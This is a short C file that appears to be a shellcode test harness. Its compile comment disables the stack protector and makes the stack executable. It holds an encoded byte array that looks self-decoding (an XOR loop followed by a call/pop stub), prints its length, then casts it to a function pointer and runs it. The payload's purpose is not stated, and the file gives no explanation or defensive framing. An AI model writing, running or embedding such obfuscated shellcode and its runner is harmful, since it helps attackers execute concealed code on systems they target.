/* Compilation: gcc -fno-stack-protector -z execstack shellcode.c -o shellcode */

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xfc\xb2\x95\x52\xeb\x13\x5e\x58\x8a\x0e\x30\x06"
"\x8a\x06\x01\xd1\xd2\xc8\x38\x16\x74\x08\x46\xeb"
"\xef\xe8\xe8\xff\xff\xff\xa4\x58\x56\x62\xff\xdd"
"\xb8\xf3\x00\x6c\xf5\xf1\xcb\xe7\x7b\xb3\xd9\xc4"
"\x22\x2f\x79\x37\x00\x95\xf3\x15";

main()
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}

	
